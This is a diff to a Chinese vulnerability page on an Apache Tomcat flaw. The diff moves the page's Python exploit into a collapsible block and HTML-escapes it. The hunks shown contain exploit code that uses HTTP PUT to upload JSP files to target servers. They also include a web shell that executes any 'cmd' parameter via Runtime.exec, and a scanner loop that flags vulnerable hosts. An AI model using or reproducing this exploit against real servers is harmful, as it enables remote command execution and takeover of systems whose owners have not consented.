@@ -22,8 +22,10 @@ Apache Tomcat版本9.0.0.M1至9.0.0
 Apache Tomcat版本8.5.0至8.5.22
 Apache Tomcat版本8.0.0.RC1至8.0.46
 Apache Tomcat版本7.0.0至7.0.81
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞EXP
 
 ```python
@@ -112,7 +114,7 @@ signal.signal(signal.SIGINT, signal_handler)
 
 
 def removetags(tags):
-    remove = re.compile('<.*?>')
+    remove = re.compile('&lt;.*?&gt;')
     txt = re.sub(remove, '\n', tags)
     return txt.replace("\n\n\n","\n")
 
@@ -123,7 +125,7 @@ def getContent(url,f):
     return re.content
 
 def createPayload(url,f):
-    evil='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
+    evil='&lt;% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%&gt;'
     headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
     req=requests.put(str(url)+str(f)+"/",data=evil, headers=headers)
     if req.status_code==201:
@@ -131,25 +133,25 @@ def createPayload(url,f):
 
 
 def RCE(url,f):
-    EVIL="""<FORM METHOD=GET ACTION='{}'>""".format(f)+"""
-    <INPUT name='cmd' type=text>
-    <INPUT type=submit value='Run'>
-    </FORM>
-    <%@ page import="java.io.*" %>
-    <%
+    EVIL="""&lt;FORM METHOD=GET ACTION='{}'&gt;""".format(f)+"""
+    &lt;INPUT name='cmd' type=text&gt;
+    &lt;INPUT type=submit value='Run'&gt;
+    &lt;/FORM&gt;
+    &lt;%@ page import="java.io.*" %&gt;
+    &lt;%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
       String s = null;
       try {
-         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         Process p = &#82;untime.getRuntime().&#101;xec(cmd,null,null);
          BufferedReader sI = new BufferedReader(new
 InputStreamReader(p.getInputStream()));
-         while((s = sI.readLine()) != null) { output += s+"</br>"; }
+         while((s = sI.readLine()) != null) { output += s+"&lt;/br&gt;"; }
       }  catch(IOException e) {   e.printStackTrace();   }
    }
-%>
-<pre><%=output %></pre>"""
+%&gt;
+&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;"""
 
 
 
@@ -265,8 +267,9 @@ else:
             createPayload(str(i)+"/",checker)
             con=getContent(str(i)+"/",checker)
             if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
-                print(str(i)+"\033[91m"+" [ Vulnerable ] ""\033[0m")
-```
+                print(str(i)+"\033[91m"+" [ Vulnerable ] ""\033[0m")</code></pre>
+
+</details>
 
 ---
 
